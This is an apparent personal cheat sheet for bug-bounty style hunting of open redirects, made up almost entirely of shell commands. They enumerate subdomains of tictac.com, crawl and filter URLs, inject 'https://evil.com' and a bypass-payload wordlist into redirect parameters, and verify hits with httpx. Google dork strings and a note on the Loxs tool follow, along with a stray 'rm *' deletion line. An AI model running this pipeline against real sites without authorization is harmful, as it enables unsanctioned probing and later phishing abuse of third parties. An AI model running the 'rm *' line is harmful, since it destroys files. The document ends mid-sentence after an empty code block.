

subfinder -d tictac.com -all -o subdomains1.txt & assetfinder --subs-only tictac.com > subdomains2.txt & wait




sort -u subdomains1.txt subdomains2.txt -o uniqsubs.txt && httpx-toolkit -l uniqsubs.txt -o finallist.txt





cat finallist.txt | gau --o urls1.txt & cat finallist.txt | katana -d 2 -o urls2.txt &  cat finallist.txt | urlfinder -o urls3.txt & cat finallist.txt | hakrawler > urls4.txt & wait



cat urls1.txt urls2.txt urls3.txt urls4.txt | uro | sort -u | tee final.txt && cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt


cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -status-code  -fr -mr "evil.com" 



	
cat redirect_params.txt | while read url; do cat /home/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -status-code -fr -mr "google.com"

rm *
------------------------------------------------------------
site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target

google dorking for open redirct manuaal

After this use gf patterns,qsreplace and httpx grep to filter valid open redirects with the following command:

cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com" 


For testing more advanced bypass payloads rather than simple ones use this command to try all bypass payloads from my custom wordlist:


cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"








---------------------
Using Loxs tool
For a simpler way to find open redirects you can use our Loxs tool which automatically detects open redirects without any false positives. Use the following command first:
```
```
Copy
cat urls.txt | sed 's/=.*/=/' | uro >final.txt
urls.txt: A file containing URLs that have been filtered and sorted using gf patterns or other methods.
The sed command is used to extract all parameters from URLs and convert them into empty parameters for fuzzing.
After this send the final.txt file into the Loxs tool, select the open redirect option, choose the urls.txt file and select the payload file after that The result will look like this:
